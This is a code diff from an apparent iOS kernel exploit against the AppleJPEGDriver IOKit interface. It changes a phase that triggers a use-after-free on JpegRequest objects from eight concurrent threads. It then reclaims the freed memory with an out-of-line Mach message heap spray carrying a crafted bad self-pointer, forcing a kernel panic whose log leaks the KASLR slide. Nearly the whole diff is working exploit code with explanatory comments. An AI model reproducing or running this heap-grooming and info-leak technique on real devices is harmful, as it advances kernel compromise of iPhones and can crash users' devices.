@@ -577,17 +577,23 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         IOServiceClose(conn);
 
         // ========================================================
-        // PHASE 2: Aggressive No-Reclaim UAF Crash
-        // 8 threads × continuous hammering — maximize in-flight
-        // requests at close time to beat HW completion.
-        // On release kernel, freed memory may retain valid data.
-        // We spray with OOL reclaim pattern to force a crash
-        // through corrupted vtable → data abort → panic log.
+        // PHASE 2: OOL Reclaim Crash — force data abort via bad self-ptr
+        //
+        // Release kernel doesn't poison freed memory → no crash on stale data.
+        // Instead: reclaim freed JpegRequest slots via OOL spray with a
+        // controlled payload where req+0x80 (self-pointer) = 0xCAFE000000000001.
+        //
+        // Queue walk: LDR X8,[link_node]; LDR X8,[X8,#8]
+        // reads our 0xCAFE000000000001 → dereference → DATA ABORT.
+        //
+        // Panic log: FAR=0xCAFE000000000001 (our marker),
+        // X19=AppleJPEGDriver*, PC/LR=kernel text → KASLR slide.
         // ========================================================
         [self log:@""];
-        [self log:@"=== Phase 2: Aggressive UAF Crash ==="];
+        [self log:@"=== Phase 2: OOL Reclaim Crash (bad self-ptr) ==="];
         [self log:@"WARNING: This WILL kernel panic the device."];
         [self log:@"After reboot: run scripts/pull_logs.py for panic log."];
+        [self log:@"Search panic log for 0xcafe000000000001 to find FAR."];
         [self log:@"Starting in 3..."];
         sleep(1);
         [self log:@"2..."];
@@ -610,45 +616,83 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         uint32_t srcID2 = IOSurfaceGetID(srcSurf2);
         uint32_t dstID2 = IOSurfaceGetID(dstSurf2);
 
-        // 8 threads, each continuously doing open→submit→close
-        // Total ~2000+ freed JpegRequests in rapid succession
+        // Build crash payload: 0x440 bytes
+        // +0x00: NULL (safe vtable, skip PC control path)
+        // +0x78: NULL (link_node.next = end queue walk)
+        // +0x80: 0xCAFE000000000001 (bad self-ptr → DATA ABORT at this addr)
+        // +0x310: 0 (flags = not progressive)
+        uint8_t *crashPayload = calloc(0x440, 1);
+        if (crashPayload) {
+            memset(crashPayload, 0x41, 0x440);        // 'A' filler
+            memset(crashPayload + 0x00, 0, 8);        // vtable = NULL
+            memset(crashPayload + 0x78, 0, 16);       // link_node = NULL
+            *(uint64_t *)(crashPayload + 0x80) = 0xCAFE000000000001ULL; // BAD self-ptr
+            crashPayload[0x310] = 0;                   // flags
+        }
+
+        // OOL spray port
+        mach_port_t sprayPort = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort,
+                               MACH_MSG_TYPE_MAKE_SEND);
+
+        // --- Step 1: Free 500 JpegRequests (8 threads concurrent) ---
         __block int32_t totalFreed = 0;
         __block BOOL stopHammer = NO;
-        dispatch_group_t crashGroup = dispatch_group_create();
+        dispatch_group_t freeGroup = dispatch_group_create();
 
         for (int t = 0; t < 8; t++) {
-            dispatch_group_async(crashGroup,
+            dispatch_group_async(freeGroup,
                 dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-                for (int i = 0; i < 40 && !stopHammer && self.running; i++) {
+                for (int i = 0; i < 25 && !stopHammer && self.running; i++) {
                     io_connect_t vc = [self openUC:svc];
                     if (!vc) continue;
                     int n = [self submitAsyncRequests:vc
                         srcID:srcID2 dstID:dstID2 width:W2 height:H2
-                        count:8 tokenBase:(0xCAFE00 + t * 1000 + i)];
+                        count:5 tokenBase:(0xCAFE00 + t * 1000 + i)];
                     IOServiceClose(vc);
                     __sync_fetch_and_add(&totalFreed, n);
                 }
             });
         }
 
-        dispatch_group_wait(crashGroup,
+        dispatch_group_wait(freeGroup,
             dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
         stopHammer = YES;
+        [self log:@"Freed %d JpegRequests across 8 threads", totalFreed];
 
-        [self log:@"Freed %d JpegRequests across 8 threads (no reclaim)", totalFreed];
-        [self log:@"Waiting for HW completions — stale queue walk imminent..."];
+        // --- Step 2: Reclaim freed slots with crash payload ---
+        [self log:@"Reclaiming freed slots with bad self-ptr 0xcafe000000000001..."];
+        [self sprayOOLWithPayload:crashPayload size:0x440 count:300 port:sprayPort];
+        [self log:@"Sprayed 300 × 0x440 crash payloads via OOL"];
+
+        // --- Step 3: Trigger more HW activity to walk the stale queue ---
+        [self log:@"Submitting trigger requests to activate queue walk..."];
+        for (int t = 0; t < 5 && self.running; t++) {
+            io_connect_t trigger = [self openUC:svc];
+            if (!trigger) continue;
+            [self submitAsyncRequests:trigger srcID:srcID2 dstID:dstID2
+                width:W2 height:H2 count:5 tokenBase:0x5A00 + t];
+            IOServiceClose(trigger);
+        }
+
+        [self log:@"Waiting for HW to process stale queue entries..."];
+        [self log:@"Expect: LDR from 0xcafe000000000001 → DATA ABORT panic"];
+        [self log:@"Panic log FAR=0xcafe000000000001, regs contain kernel addrs"];
 
         usleep(5000000); // 5 seconds for HW drain
 
+        // If we reach here, device survived
         BOOL survived = [self checkDriverHealth:svc];
         [self log:@"Device survived! Driver: %@", survived ? @"OK" : @"BROKEN"];
         if (survived) {
-            [self log:@"No panic. Likely: release kernel doesn't poison freed"];
-            [self log:@"memory → stale queue data still ~valid → no crash."];
-            [self log:@"Next: try OOL spray corrupt vtable path (PC Control style)"];
-            [self log:@"to force a recognizable crash for register analysis."];
+            [self log:@"Reclaim crash also failed. The UAF window may close"];
+            [self log:@"before HW processes stale entries, or the queue walk"];
+            [self log:@"path changed in iOS 26.2 to skip invalid self-pointers."];
         }
 
+        free(crashPayload);
+        mach_port_destroy(mach_task_self(), sprayPort);
         CFRelease(srcSurf2);
         CFRelease(dstSurf2);
         IOObjectRelease(svc);
